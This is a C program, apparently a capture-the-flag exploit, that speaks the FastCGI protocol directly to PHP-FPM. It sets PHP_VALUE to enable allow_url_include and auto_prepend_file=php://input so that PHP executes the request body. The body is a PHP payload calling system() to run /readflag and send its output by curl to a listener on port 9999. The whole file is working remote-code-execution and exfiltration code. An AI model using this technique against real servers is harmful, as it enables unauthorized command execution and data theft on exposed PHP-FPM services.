#include <stdio.h>
#include <stdlib.h>
#include "fcgi.h"
#include <sys/types.h>
#include <sys/socket.h>

int main()
{
    FastCgi_t *c;
    c = (FastCgi_t *)malloc(sizeof(FastCgi_t));
    char res[99999];
    FastCgi_init(c);
    setRequestId(c, 1); 
    startConnect(c);
    sendStartRequestRecord(c);

    sendParams(c, "SCRIPT_FILENAME", "/var/www/html/decode_file.php");
    sendParams(c, "REQUEST_METHOD", "POST");
    sendParams(c, "CONTENT_LENGTH", "71"); //　17 为body的长度 !!!!
    sendParams(c, "CONTENT_TYPE", "application/x-www-form-urlencoded");
    sendParams(c, "PHP_VALUE","allow_url_include = On\nauto_prepend_file = php://input");
    sendParams(c, "DOCUMENT_ROOT","/");
    sendEndRequestRecord(c);

    /*FCGI_Header makeHeader(int type, int requestId,
                       int contentLength, int paddingLength)*/
    //制造头为了发 body
    FCGI_Header t = makeHeader(FCGI_STDIN, c->requestId_, 71, 0); //　17 为body的长度 !!!!
    send(c->sockfd_, &t, sizeof(t), 0);

    /*发送正式的 body */
    send(c->sockfd_, "<?php system('/readflag | xargs -i curl 127.0.0.1:9999 -d {}');die();?>", 71, 0); //　17 为body的长度 !!!!

    //制造头告诉　body　结束　
    FCGI_Header endHeader;
    endHeader = makeHeader(FCGI_STDIN, c->requestId_, 0, 0);
    send(c->sockfd_, &endHeader, sizeof(endHeader), 0);

    printf("end-----\n");

    readFromPhp(c,res);

    printf("%s\n",res);

    FastCgi_finit(c);
    return 0;
}
